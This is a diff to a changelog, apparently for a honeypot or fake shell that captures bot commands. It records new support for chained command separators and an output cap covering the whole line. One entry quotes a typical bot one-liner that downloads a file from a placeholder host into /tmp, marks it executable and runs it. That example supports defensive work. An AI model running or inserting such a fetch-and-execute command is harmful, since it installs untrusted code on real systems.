@@ -7,6 +7,21 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+- Command separators: `;`, `&&`, and `||` now split a line into commands that
+  run in order, with `&&`/`||` gated on the previous exit status. Bot payloads
+  are almost always one-liners (`cd /tmp; wget http://x/a; chmod +x a; ./a`);
+  each segment used to be handed to the first command as arguments, so the line
+  produced `cat: |: No such file or directory`-style nonsense and nothing after
+  the first segment was ever captured. Operators inside quotes, or escaped, stay
+  literal, and splitting happens before variable expansion — so a `;` arriving
+  in a variable's value is data, not an extra command.
+
+### Security
+- The 1 MiB output cap now bounds a whole command line, not just one command:
+  a chained line could otherwise multiply the per-command cap by the number of
+  segments that fit in the 4096-byte input limit.
+
 ## [0.3.0] - 2026-07-30
 
 ### Added
